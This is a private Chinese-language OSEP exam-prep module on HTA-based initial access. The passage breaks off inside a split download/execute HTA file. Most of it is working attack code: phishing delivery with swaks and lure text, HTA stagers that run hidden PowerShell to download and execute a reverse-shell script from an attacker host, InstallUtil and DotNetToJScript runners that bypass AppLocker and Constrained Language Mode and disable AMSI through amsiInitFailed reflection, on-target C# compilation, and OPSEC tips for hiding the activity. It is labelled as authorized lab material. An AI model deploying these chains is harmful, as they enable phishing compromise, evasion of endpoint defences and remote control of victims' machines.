::: warning 私人教材 · 仅供授权实验与备考学习
本文是个人备考教材，仓库不公开。源码只用于 OSEP 官方实验/考试环境或你拥有书面授权的目标。禁止转发到公开网络、禁止对未授权系统使用。
:::

# 模块 M02：HTA 入口（邮件无 Office 宏时的第一阶段）

> 覆盖场景：6、7、8
> cheat sheet 依据：`HTA`、`C# for CLM Bypass with PS Script`、`C# for CLM Bypass with DotNetToJScript`、`HTA JScript Access`、`Disable AMSI`、`InstallUtil` ｜ 教材依据：第 13 章（场景 6 原文依据 C4/第 13 章；场景 7、8 原文依据 C4）
> 前置依赖：攻击机上可被目标访问的 HTTP 服务（Kali `python3 -m http.server` 即可）；一个能编译 .NET Framework 的 Windows 环境（实验网任意 Win10 或自备 Windows VM，用于产出 `m02-clm-bypass-runspace.exe`）；邮件投递链路（swaks/sendEmail，见场景 6）。

**本文档三个场景的关系**：场景 6 是"HTA 当第一阶段，目标有 AppLocker 无 Office"；场景 7 是"AppLocker + CLM + AMSI 全开"，需要把 HTA、InstallUtil 兼容程序集、自定义 Runspace、AMSI 处理、第二阶段 Runner **组合**起来验证；场景 8 是"同一链路下载+执行合在一起不工作，拆开才工作"的**时序/生命周期排错**——不要一上来就怪杀软。三者共用同一套文件，差别在组合方式与排错顺序。

---

## 场景 6：邮件入口存在，但没有可用的 Office 宏入口

**场景回顾**：目标没有 Office（宏入口不可用），但会打开邮件里的链接或 .hta 文件；同时目标启用了 AppLocker，直接启动你上传的 EXE 会被拒绝。需要一条"不含独立 EXE 启动"的执行链。

**前提与假设**：目标能收邮件并点击链接；用户会打开 HTA（浏览器打开 URL 形式，或双击附件形式）；AppLocker 是"默认规则"形态（放行 `%SystemRoot%\*` 下的签名程序，如 `mshta.exe`、`powershell.exe`、`csc.exe`、`InstallUtil.exe`），但**不允许我们上传的任意 EXE 直启**。我方已有：目标能访问的 `http://LHOST`（静态文件服务器）、监听端口 `LPORT`。

**准备（攻击机侧）**：
1. 搭静态服务器与监听：
   ```bash
   mkdir -p ~/osep/payloads/web && cd ~/osep/payloads/web
   cp <本项目>/scripts/hta/m02-hta-callback.hta ./ok.hta
   cp <本项目>/scripts/hta/m02-hta-powershell-stager.hta ./stager.hta
   printf 'ok' > ok.txt          # 回调探针用
   python3 -m http.server 80     # 或 8080，注意 URL 里写全
   nc -lvnp LPORT                # 第二阶段的回连监听
   ```
2. 预先准备好第二阶段脚本 `shell.ps1`（老而稳的 TCP 回连，见 cheat sheet `C# for CLM Bypass with PS Script` 里的 shell.ps1 模板；场景 6 无 CLM 时可直接用），替换其中 `[ATTACKER_IP]`/`[PORT]` 为 `LHOST`/`LPORT` 后放 web 根目录。
3. 按场景 7 的方法预编译 **x86 与 x64 两个** InstallUtil 兼容 runner（`m02-clm-bypass-runspace.cs`），本场景作为兜底备选。
4. 邮件投递（cheat sheet `HTA` 一节；URL 形式优于附件，附件常被过滤器拦）：
   ```bash
   # 发"链接"诱导点击（推荐）：HTA 放在 web 根，正文只给 http://LHOST/stager.hta
   swaks --body 'Please click here http://LHOST/stager.hta' \
     --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" \
     --header "Subject: Invoice issue" -t TARGET -f USER@LHOST_DOMAIN \
     --server SMTP_SERVER
   # 附件形式（可能被过滤，仅备选）：
   sendEmail -s SMTP_SERVER -t TARGET -f sender@example.com \
     -u "Subject: issue" -m "see attached" -a ~/osep/payloads/web/stager.hta
   ```

**执行步骤**：
1. 先验证"HTA 能触发、JScript 能跑"：把 `ok.hta` 发给目标（或直接在已控的同类环境点开 `http://LHOST/ok.hta`）。它只做一次无害 HTTP 回调（`/cb?u=<用户名>@<主机名>`），不会落地任何 payload。**看到服务器日志里有 `/ok.hta` 与 `/cb` 两个请求即证明 mshta→JScript→ActiveX 全通**。
2. 无 CLM（可用 `powershell -ep bypass` 确认，见步骤 3 判断）时用 `stager.hta`：mshta 执行其中 JScript，`WScript.Shell.Run` 启动 `powershell.exe -nop -w hidden -Command "IEX(DownloadString 'http://LHOST/shell.ps1')"`。观察：
   - web 日志出现 `GET /stager.hta`、`GET /shell.ps1`；
   - `nc` 监听出现回连。
3. 判断要不要进场景 7 的完整链：在会话里跑 `m00-recon-defenses.ps1`，看 `$ExecutionContext.SessionState.LanguageMode`（`ConstrainedLanguage` = 有 CLM）、AppLocker 有效规则、AMSI 是否生效。**只要 CLM 或"powershell.exe 被 AppLocker 直接拒绝"任一为真，立即切场景 7 的组合链，不要在这里反复试 IEX 变体。**
4. 若只是"EXE 被 AppLocker 拦、PowerShell 可用"（无 CLM）：仍可用 HTA + PowerShell 下载落地后经 `InstallUtil.exe /U` 加载（InstallUtil 在 `%SystemRoot%` 下，默认规则放行），runner 见 `m02-clm-bypass-runspace.cs`。
5. 位数核对表（HTA 由 mshta.exe 承载，随系统位数）：x64 系统用 `C:\Windows\System32\mshta.exe`（64 位）会拉 64 位 powershell；需要 x86 载荷时改走 `C:\Windows\SysWOW64\mshta.exe`，或在脚本里显式调用 `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/hta/m02-hta-callback.hta` | 最小 HTA，确认 mshta/JScript/出网 | 替换 `LHOST` |
| `scripts/hta/m02-hta-powershell-stager.hta` | HTA→PowerShell IEX 拉 `shell.ps1` | 替换 `LHOST` |
| `scripts/csharp/m02-clm-bypass-runspace.cs` | InstallUtil 兼容 runner（x86/x64 各编一份） | 替换 `LHOST` 后编译 |
| `scripts/hta/m02-hta-embedded-clm-bypass.hta` | 单文件兜底：内嵌 C#，目标机现编现跑 | 替换 `LHOST` |


#### 源码 `scripts/hta/m02-hta-callback.hta` {#scripts-hta-m02-hta-callback-hta}

````html
<!--
用途：最小 HTA 回调——确认 mshta 承载的 JScript 能执行且能出网（无害，不落地任何 payload）
场景：6 / 7 / 8（任何 HTA 链路的第一个验证步骤）
依赖：目标机 mshta.exe（系统自带）；攻击机 HTTP 服务（python3 -m http.server 80）
使用：将 LHOST 替换为攻击机 IP 后放到 web 根；目标打开 http://LHOST/m02-hta-callback.hta
      攻击机侧观察日志出现 GET /m02-hta-callback.hta 与 GET /cb?u=... 即成功
占位符：LHOST=攻击机可达 IP；回调路径固定为 /cb
测试状态：未在 Windows 实测（本机为 macOS）；JScript 语法经人工核对
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02cb" APPLICATIONNAME="m02cb"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    // 阶段标记：mshta 一开始执行本脚本就发一次请求
    function beacon(path) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", "http://LHOST" + path, false); // false = 同步等返回
            x.send();
        } catch (e) { /* 出网失败也继续走完脚本，便于对照日志 */ }
    }
    beacon("/cb?stage=hta-start");

    var sh = new ActiveXObject("WScript.Shell");

    // 1) 回传身份（用户@主机），证明 ActiveX 可用
    var who = sh.ExpandEnvironmentStrings("%USERNAME%") + "@" +
              sh.ExpandEnvironmentStrings("%COMPUTERNAME%");
    beacon("/cb?u=" + encodeURIComponent(who));

    // 2) 无害出网探测：请求 ok.txt（内容可为任意文本），不执行其内容
    //    sh.Run("powershell.exe -nop -w hidden -Command \"(New-Object Net.WebClient).DownloadString('http://LHOST/ok.txt')\"", 0, true);

    // 说明：确认本文件三个回显（hta-start / u= / 可选 ok.txt GET）都出现后，
    // 才把入口换成真正的 stager；任何一个缺失先解决对应环节，不要直接上 payload。
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

#### 源码 `scripts/hta/m02-hta-powershell-stager.hta` {#scripts-hta-m02-hta-powershell-stager-hta}

````html
<!--
用途：HTA→PowerShell 拉取并执行第二阶段（shell.ps1），场景 6 主入口；场景 8 中作为"合并形态"对照
场景：6（无 Office、无 CLM 时）；8（对照用：一条命令内 IEX 下载内容）
依赖：目标机 mshta.exe + powershell.exe（AppLocker 默认规则放行 System32）；攻击机 HTTP 服务与监听
使用：替换 LHOST/LPORT 后放 web 根；把 shell.ps1（TCP 回连脚本）放到同服务器；
      目标打开 http://LHOST/m02-hta-powershell-stager.hta 或 mshta.exe http://LHOST/xxx.hta
占位符：LHOST=攻击机 IP；LPORT=回连监听端口（在 shell.ps1 内使用）；URL=第二阶段脚本地址
测试状态：未在 Windows 实测（本机为 macOS）；引号嵌套规则见下方注释，改动后请自测
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02st" APPLICATIONNAME="m02st"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    // 回显点：帮助判断 mshta 是否真的跑到了这里
    function beacon(path) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", "http://LHOST" + path, false);
            x.send();
        } catch (e) {}
    }
    beacon("/cb?stage=hta-start");

    var sh = new ActiveXObject("WScript.Shell");

    // 第二阶段脚本地址：这里统一用 URL 占位符，使用前替换
    // 若只需要"下载执行"一条 PowerShell 命令，把命令改成：
    //   IEX((New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1'))
    // 若目标经代理出网，命令内先设代理再 IEX（见 M09 场景 28）。
    var url = "http://LHOST/shell.ps1";

    // 引号规则（HTA 内最常见的断点）：
    // 外层 Run(...) 用单引号包整个命令行，命令里的参数用双引号包，
    // PowerShell 代码内的字符串用单引号，因此需要 \' 转义（本行已示范）。
    // 若改出问题，最稳做法：把整段 PowerShell 用 base64 编码后用 -enc 传参，
    // 命令串里只剩一层引号（见 m02-hta-download-exec-split.hta 头注释示例）。
    var cmd = "powershell.exe -nop -w hidden -Command " +
              "\"IEX((New-Object Net.WebClient).DownloadString('" + url + "'))\"";

    // 0=隐藏窗口, true=等进程结束再返回
    var rc = sh.Run(cmd, 0, true);
    if (rc !== 0) { beacon("/cb?stage=iex-fail&rc=" + rc); }
    else          { beacon("/cb?stage=iex-done"); }
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

#### 源码 `scripts/csharp/m02-clm-bypass-runspace.cs` {#scripts-csharp-m02-clm-bypass-runspace-cs}

````csharp
// 用途：InstallUtil 兼容 runner——由 InstallUtil.exe /U 触发 Uninstall()，在自定义 Runspace(FullLanguage) 内
//       先做 AMSI 处理，再 IEX 下载第二阶段 shell.ps1（绕 AppLocker 的 EXE 直启限制 + CLM）
// 场景：6（EXE 被 AppLocker 拒、PowerShell 可用的兜底）/ 7（AppLocker+CLM+AMSI 组合链核心）
// 依赖：Windows + .NET Framework 4 + System.Management.Automation（GAC，PowerShell 自带）；用 csc 编译
// 使用：在 Windows 编译机上编译（x64 与 x86 各一份）：
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /out:m02stage64.exe ^
//     /r:System.Management.Automation.dll /r:System.Configuration.Install.dll m02-clm-bypass-runspace.cs
//   （32 位用 Framework\v4.0.30319；若 /r 按简单名解析失败，从 GAC 给全路径：
//    C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<版本>__31bf3856ad364e35\...）
//   产物放 Kali web 根，目标侧执行：
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U <exe>
//   注意：InstallUtil 只运行 Uninstall()，Main() 不会被执行
// 占位符：LHOST=攻击机 IP（替换下方 DEFAULT_URL）；LPORT 在 shell.ps1 内；可用环境变量 M02_URL 覆盖 URL
// 测试状态：未实测（本机为 macOS，无 csc）；需在 Windows 编译并在实验网验证整条链
using System;
using System.Collections;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace M02
{
    class Program
    {
        static void Main(string[] args)
        {
            // 直接被运行时只提示用法；本程序的执行入口是下方 Installer.Uninstall（InstallUtil /U 触发）
            Console.WriteLine("m02-clm-bypass-runspace: run via InstallUtil.exe /U <this.exe>");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Stage : System.Configuration.Install.Installer
    {
        private const string DEFAULT_URL = "http://LHOST/shell.ps1";

        public override void Uninstall(IDictionary savedState)
        {
            // 允许用环境变量覆盖 URL，避免为换地址重新编译：
            //   目标侧：set M02_URL=http://LHOST/shell.ps1 && InstallUtil.exe /U ...
            string url = Environment.GetEnvironmentVariable("M02_URL");
            if (string.IsNullOrEmpty(url)) { url = DEFAULT_URL; }

            // 关键点：CLM 是 powershell.exe 进程内引擎的语言模式限制；
            // 本进程是 InstallUtil，自建 Runspace 时引擎处于 FullLanguage。
            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                // 1) AMSI 处理：AMSI 挂在 System.Management.Automation 引擎上，与进程是谁创建无关，
                //    所以要在同一个引擎内先置 amsiInitFailed 再执行下载内容（FullLanguage 下允许反射）。
                // 2) 下载并执行第二阶段（shell.ps1 内含 TCP 回连，需先替换 LHOST/LPORT）。
                string script =
                    "$f=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')" +
                    ".GetField('amsiInitFailed','NonPublic,Static');" +
                    "if($f){$f.SetValue($null,$true)};" +
                    "IEX((New-Object Net.WebClient).DownloadString('" + url + "'));";

                ps.AddScript(script);
                try { ps.Invoke(); }
                catch (Exception ex)
                {
                    // 失败要有可读输出：InstallUtil /LogToConsole=false 时不落盘，错误走 stderr
                    Console.Error.WriteLine("[m02] runspace invoke failed: " + ex.Message);
                }
                rs.Close();
            }
        }
    }
}
````

#### 源码 `scripts/hta/m02-hta-embedded-clm-bypass.hta` {#scripts-hta-m02-hta-embedded-clm-bypass-hta}

````html
<!--
用途：单文件完整组合链 HTA：mshta→(写 C# 源码)→csc 现编译→InstallUtil /U→自定义 Runspace→AMSI 处理→IEX shell.ps1
场景：7（AppLocker + CLM + AMSI 全开时的主链路，无需预置编译产物）
依赖：目标机 mshta.exe / csc.exe / InstallUtil.exe（均位于 SystemRoot 下，AppLocker 默认规则放行）
使用：替换本文件内 LHOST 两处（JS 常量 cbHost 与内嵌 C# 里的 shell.ps1 地址）后放 web 根；
      目标打开 http://LHOST/m02-hta-embedded-clm-bypass.hta
占位符：LHOST=攻击机 IP；shell.ps1=放在 web 根的第二阶段回连脚本（先自行替换 LHOST/LPORT）
测试状态：未在 Windows 实测（本机为 macOS）；需在实验网完整验证（场景 7 要求组合验证）
注意：内嵌 C# 与 scripts/csharp/m02-clm-bypass-runspace.cs 逻辑一致；改动其一请同步另一份
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02clm" APPLICATIONNAME="m02clm"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    var cbHost = "http://LHOST";   // 回显用
    var psURL  = "http://LHOST/shell.ps1"; // runner 内下载的第二阶段

    function beacon(p) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", cbHost + p, false);
            x.send();
        } catch (e) {}
    }
    function fso() { return new ActiveXObject("Scripting.FileSystemObject"); }

    // 选可写目录：优先 C:\Windows\Tasks（AppLocker 只查直启 EXE，不查 InstallUtil 加载的程序集），失败退回 %TEMP%
    function pickDir() {
        var sh = new ActiveXObject("WScript.Shell");
        var d = "C:\\Windows\\Tasks";
        try { fso().CreateFolder(d); } catch (e) {}
        try {
            var t = d + "\\.wtest";
            var f = fso().CreateTextFile(t, true); f.Close(); fso().DeleteFile(t);
            return d;
        } catch (e) { return sh.ExpandEnvironmentStrings("%TEMP%"); }
    }

    // 定位 .NET Framework 目录（按进程位数）与 GAC 里的 System.Management.Automation.dll
    function fxDir() {
        var sh = new ActiveXObject("WScript.Shell");
        var arch = sh.Environment("PROCESS")("PROCESSOR_ARCHITECTURE");
        var pre = (arch === "x86") ? "Framework" : "Framework64";
        var d = "C:\\Windows\\Microsoft.NET\\" + pre + "\\v4.0.30319";
        if (!fso().FolderExists(d)) { d = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"; }
        return d;
    }
    function gacSmaDll() {
        var base = "C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\";
        if (!fso().FolderExists(base)) { return ""; }
        var e = new Enumerator(fso().GetFolder(base).SubFolders);
        for (; !e.atEnd(); e.moveNext()) {
            var p = base + e.item().Name + "\\System.Management.Automation.dll";
            if (fso().FileExists(p)) { return p; }
        }
        return "";
    }

    beacon("/cb?stage=hta-start");

    // ---- 内嵌 C# 源码（与 m02-clm-bypass-runspace.cs 等价，精简到可内嵌）----
    // 约定：每行存为 JS 双引号字符串；源码内不使用双引号与反斜杠，避免转义错误。
    // 如需修改 URL：改 psURL 会同时影响下行 R10（在 C# 里拼接）。
    var csLines = [
        "using System;",
        "using System.Collections;",
        "using System.Management.Automation;",
        "using System.Management.Automation.Runspaces;",
        "using System.Configuration.Install;",
        "namespace M02 {",
        "  [System.ComponentModel.RunInstaller(true)]",
        "  public class S : System.Configuration.Install.Installer {",
        "    public override void Uninstall(IDictionary saved) {",
        "      string u = '" + psURL + "';",
        "      using (Runspace rs = RunspaceFactory.CreateRunspace()) {",
        "        rs.Open();",
        "        PowerShell ps = PowerShell.Create();",
        "        ps.Runspace = rs;",
        "        string sc = \"$f=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static');if($f){$f.SetValue($null,$true)};IEX((New-Object Net.WebClient).DownloadString(u));\";",
        "        ps.AddScript(sc);",
        "        ps.Invoke();",
        "        rs.Close();",
        "      }",
        "    }",
        "  }",
        "}"
    ];

    var dir = pickDir();
    var csPath = dir + "\\m02stage.cs";
    var exePath = dir + "\\m02stage.exe";
    try {
        var w = fso().CreateTextFile(csPath, true);
        for (var i = 0; i < csLines.length; i++) { w.WriteLine(csLines[i]); }
        w.Close();
        beacon("/cb?stage=cs-written&dir=" + dir);
    } catch (e) { beacon("/cb?stage=cs-write-fail"); }

    var fx = fxDir();
    var sma = gacSmaDll();
    var csc = fx + "\\csc.exe";
    // 无 GAC 路径时退回按简单名引用（部分环境可用），并在日志里留痕迹便于排查
    var refs = (sma !== "") ? "/r:\"" + sma + "\" /r:\"" + fx + "\\System.Configuration.Install.dll\""
                            : "/r:System.Management.Automation.dll /r:System.Configuration.Install.dll";
    var cc = csc + " /nologo /out:\"" + exePath + "\" " + refs + " \"" + csPath + "\"";

    var sh = new ActiveXObject("WScript.Shell");
    var rc1 = sh.Run(cc, 0, true);
    if (rc1 !== 0) { beacon("/cb?stage=compile-fail&rc=" + rc1); }
    else if (!fso().FileExists(exePath)) { beacon("/cb?stage=compile-fail&reason=no-exe"); }
    else {
        beacon("/cb?stage=compile-ok");
        var iu = fx + "\\InstallUtil.exe";
        // /U 触发上面 Installer.Uninstall()：自定义 Runspace(FullLanguage) → AMSI 处理 → IEX(psURL)
        var cmd = iu + " /logfile= /LogToConsole=false /U \"" + exePath + "\"";
        var rc2 = sh.Run(cmd, 0, true);
        if (rc2 !== 0) { beacon("/cb?stage=installutil-fail&rc=" + rc2); }
        else           { beacon("/cb?stage=installutil-done"); }
    }
    // 结论：compile-fail = csc 引用/路径问题；installutil-done 后无回连 = runner 位数或 shell.ps1 被 AMSI 拦
    // 位数：本 HTA 按 mshta 位数选 Framework/Framework64；64 位目标默认 mshta 即 64 位。
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

**验证**：web 日志顺序出现 `GET /xxx.hta` → `GET /shell.ps1`（或 `/cb`），随后 `nc -lvnp LPORT` 拿到回连；`whoami` 输出为目标用户。任何一环缺失，按场景 8 的"逐环节回显"定位。

**失败分支与备选**：
- 如果 `mshta.exe` 被 AppLocker 拒（策略连 System32 都收紧）→ 改走 `cscript/wscript` 的 JScript 路线（见 M03 场景 9-10），或换一个默认放行的签名宿主。
- 如果 `.hta` 附件被邮件网关过滤 → 只发链接，HTA 放 web 根；或把链接写成 `C:\Windows\System32\mshta.exe http://LHOST/stager.hta` 形式的快捷方式再诱导。
- 如果 `DownloadString` 被拦（AMSI/Defender 对 IEX 内容扫描）→ 先跑 `Disable AMSI`（cheat sheet 同名单节）再 IEX，或直接切场景 7 的组合链。
- 如果出网只有代理 → shell.ps1 里改用 `[System.Net.WebRequest]::DefaultWebProxy` 显式挂代理（详见 M09 场景 28）。

**考试注意 / OPSEC**：HTA 会在桌面闪现一个窗口——用 `<HTA:APPLICATION ... WINDOWSTATE="minimize">` 且脚本末尾 `self.close()`，不要让窗口停在用户眼前；邮件正文不要出现真实攻击机域名，用诱惑性业务话术；先跑无害回调、后跑 payload，避免"假入口"上浪费一整个邮件回合。

---

## 场景 7：HTA 可以触发，但目标同时有 AppLocker、CLM 和 AMSI

**场景回顾**：HTA 能执行，但普通 EXE 被应用控制限制；PowerShell 处于受限语言模式（CLM：`Add-Type`、反射、动态编译不可用）；脚本内容还被 AMSI 扫描。**单一组件验证通过 ≠ 链路能通**，必须完整组合验证。

**前提与假设**：AppLocker 默认规则放行 System32 下签名程序：`mshta.exe`、`powershell.exe`（但进 CLM）、`csc.exe`、`InstallUtil.exe`；脚本文件（.ps1）被脚本规则/语言模式限制，不能直接 `powershell -File`。自定义 Runspace 是关键：由非 powershell.exe 进程（InstallUtil 承载的 .NET 程序）创建 `System.Management.Automation.Runspaces`，该引擎在 FullLanguage 下运行，且不受 AppLocker 脚本规则约束。

**准备（攻击机侧）**：
1. `shell.ps1` 改进版：在 cheat sheet 回连模板（`C# for CLM Bypass with PS Script` 一节）**首行插入 AMSI 处理**（FullLanguage 下 `amsiInitFailed` 反射法有效），再放回连代码；替换 `LHOST/LPORT`。Host 到 web 根。
2. 在 Windows 编译机上产出 runner（x64 与 x86 各一）：
   ```bat
   :: x64（目标为 64 位系统的首选）
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo ^
     /out:%USERPROFILE%\m02stage64.exe ^
     /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
     m02-clm-bypass-runspace.cs
   :: x86（备用）
   C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /nologo ^
     /out:%USERPROFILE%\m02stage32.exe ^
     /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
     m02-clm-bypass-runspace.cs
   ```
   若 `/r:System.Management.Automation.dll` 解析失败，到 GAC 找全路径引用：`C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<版本>__31bf3856ad364e35\System.Management.Automation.dll`。还要给项目加 `System.Configuration.Install` 引用（cheat sheet 同节注明 VS 里容易漏）。
3. 可选：对 exe 做 `certutil -encode m02stage64.exe enc.txt`，让 runner 能以文本形式过邮件/下载链（目标侧再 `certutil -decode`，见 cheat sheet 步骤）。
4. 把 exe/enc.txt、shell.ps1 全部放到 Kali web 根；启动 `python3 -m http.server` 与 `nc -lvnp LPORT`。

**执行步骤**：
1. 侦察确认三件事都在（用 `m00-recon-defenses.ps1`）：AppLocker 有效规则、语言模式 `ConstrainedLanguage`、`amsi.dll` 是否进进程（cheat sheet `Enumerate Defenses`/`Disable AMSI`）。三者齐备才值得上本链路。
2. 先跑 `m02-hta-callback.hta` 确认 mshta 宿主本身没被策略/杀软按进程名拦（回调 `GET /cb` 出现即可）。
3. 用 `m02-hta-embedded-clm-bypass.hta`（单文件、内嵌 C# 源码 + 目标机 csc 现编译 + InstallUtil /U 触发）或手工执行等价的"下载→解码→InstallUtil"链：
   ```
   mshta.exe http://LHOST/m02-hta-embedded-clm-bypass.hta
   ```
   链内逻辑（每步有 HTTP 回显，用于定位断点）：
   1. 写 `m02stage.cs` 到 `C:\Windows\Tasks\`（用户可写；也可 `%TEMP%`）；
   2. 调 `csc.exe` 编出 `m02stage.exe`（路径按进程位数选 Framework64/Framework）；
   3. `InstallUtil.exe /logfile= /LogToConsole=false /U <exe>` → 触发 `Installer.Uninstall()`；
   4. Uninstall 内：新建自定义 Runspace → 先在本引擎执行 AMSI 处理 → `IEX(DownloadString 'http://LHOST/shell.ps1')`；
   5. shell.ps1 回连 `LHOST:LPORT`。
4. **为什么这套能过三道关**（写进脑子，考试要能讲）：
   - AppLocker：mshta/csc/InstallUtil 都是 System32 签名程序 → 直启被允许；runner exe 是"被 InstallUtil 加载的程序集"，不是被 AppLocker 直启的进程 → 不受 EXE 规则限制；
   - CLM：约束语言模式只作用于 powershell.exe 进程内的引擎；InstallUtil 进程里自建 Runspace 是 FullLanguage，`Add-Type`/反射/`IEX` 全部可用；
   - AMSI：AMSI 挂进 System.Management.Automation 引擎（无论谁创建），所以在**同一个自定义 Runspace 里先跑 `amsiInitFailed` 反射**再 IEX 下载内容。
5. 备选执行形态（同一 runner 换触发方式）：`InstallUtil.exe /logfile= /LogToConsole=false /U` 也可以从 PowerShell（哪怕 CLM 里只能跑已允许命令）或已上线会话里调用；runner 不必非经 mshta。若 InstallUtil 被策略点名拒绝 → 用 DotNetToJScript 变体：把 `m02-clm-bypass-dotnettojscript.cs` 编成 library，经 DotNetToJScript 工具序列化成 .js 塞进 HTA（JScript 载荷加载见 M03），完全不经 EXE 与 InstallUtil。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/hta/m02-hta-embedded-clm-bypass.hta` | 单文件完整链：mshta→csc→InstallUtil→Runspace→IEX | 替换 `LHOST` |
| `scripts/csharp/m02-clm-bypass-runspace.cs` | InstallUtil 兼容 runner（自定义 Runspace + AMSI 处理） | 替换 `LHOST` 后编译 x86/x64 |
| `scripts/csharp/m02-clm-bypass-dotnettojscript.cs` | 无 EXE 备选：DotNetToJScript 载荷类 | 编译为 library，配 M03 工具序列化 |
| `scripts/hta/m02-hta-download-exec-split.hta` | 链路失败时改用"分离两阶段"排错 | 替换 `LHOST` |


#### 源码 `scripts/csharp/m02-clm-bypass-dotnettojscript.cs` {#scripts-csharp-m02-clm-bypass-dotnettojscript-cs}

````csharp
// 用途：DotNetToJScript 路线的 C# 载荷骨架（CLM 绕过版）——JScript 只做加载，重活在托管侧
// 场景：7、10（HTA/JScript 入口 + CLM + AMSI 组合）
// 依赖：.NET Framework 4.x；csc.exe 编译为 Library
// 使用：
//   csc.exe /target:library /out:clm.dll m02-clm-bypass-dotnettojscript.cs
//   再用 DotNetToJScript 转 .js，或由 m02-hta-embedded-clm-bypass.hta 承载
// 占位符：LHOST/LPORT、STAGE2_URL、XOR_KEY
// 测试状态：未编译验证（本机无 csc）；语法已人工检查
//
// 说明（场景 7 的完整链路）：
//   HTA(mshta) → JScript/COM 实例化本类 → 新建 Runspace(FullLanguage) → 加载第二阶段
//   本类只负责"在 CLM 环境下把语言能力恢复出来"，具体载荷放在第二阶段，便于独立替换。

using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Payload
{
    [ComVisible(true)]
    public class ClmRunner
    {
        private const string STAGE2_URL = "http://LHOST/stage2.b64";  // ← 替换
        private const byte XOR_KEY = 0x2A;

        public ClmRunner() { }

        public void Run()
        {
            try
            {
                byte[] enc = new WebClient().DownloadData(STAGE2_URL);
                for (int i = 0; i < enc.Length; i++) enc[i] ^= XOR_KEY;

                Assembly asm = Assembly.Load(enc);
                foreach (Type t in asm.GetTypes())
                {
                    if (!t.IsPublic) continue;
                    MethodInfo m = t.GetMethod("Run", BindingFlags.Public | BindingFlags.Static);
                    if (m != null) { m.Invoke(null, null); return; }
                }
            }
            catch (Exception ex)
            {
                // 不静默失败：便于区分"下载失败"与"加载/AMSI 失败"
                Console.Error.WriteLine("[!] CLM runner 失败: " + ex.Message);
            }
        }
    }
}
````

#### 源码 `scripts/hta/m02-hta-download-exec-split.hta` {#scripts-hta-m02-hta-download-exec-split-hta}

````html
<!--
用途：下载与执行分离的两阶段 HTA：阶段一落盘并检查文件存在，阶段二才执行；每阶段带 HTTP 回显
场景：8（"合并失败、分开成功"的时序/生命周期排错主工具）；也可作为场景 6/7 的稳妥落地形态
依赖：目标机 mshta.exe + powershell.exe（或按需换 certutil/bitsadmin 下载器）；攻击机 HTTP 服务
使用：替换 LHOST、URL、OUT 后放 web 根；目标打开 http://LHOST/m02-hta-download-exec-split.hta
      攻击机持续观察日志：hta-start -> download-done/fail -> exec-done/fail，据此定位断点
占位符：LHOST=攻击机 IP；URL=要下载的第二阶段文件地址；OUT=目标机落盘路径（默认 C:\Windows\Tasks）
测试状态：未在 Windows 实测（本机为 macOS）；JScript 语法经人工核对
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02split" APPLICATIONNAME="m02split"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    var URL = "http://LHOST/shell.ps1";      // 下载源（第二阶段脚本）
    var OUT = "C:\\Windows\\Tasks\\stage2.ps1"; // 落盘路径（Tasks 用户可写；可改 %TEMP%）
    var EXE = "";                            // 若要下载 EXE 由别的方式执行，这里填下载器参数

    function beacon(path) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", "http://LHOST" + path, false);
            x.send();
        } catch (e) {}
    }
    function fileExists(p) {
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            return fso.FileExists(p);
        } catch (e) { return false; }
    }
    function fileSize(p) {
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            return fso.GetFile(p).Size;
        } catch (e) { return -1; }
    }
    beacon("/cb?stage=hta-start");

    var sh = new ActiveXObject("WScript.Shell");

    // ---- 阶段一：只下载，等它结束 ----
    // PowerShell 版（默认）。若被拦，把下面 cmd 换成：
    //   certutil.exe -urlcache -split -f URL OUT
    //   bitsadmin.exe /transfer m02 /download /priority normal URL OUT
    // 注意本行同样遵守"外层单引号、参数双引号、PS 字符串单引号转义"的规则；
    // 嫌转义麻烦可改用上面 certutil 一行（没有内层引号）。
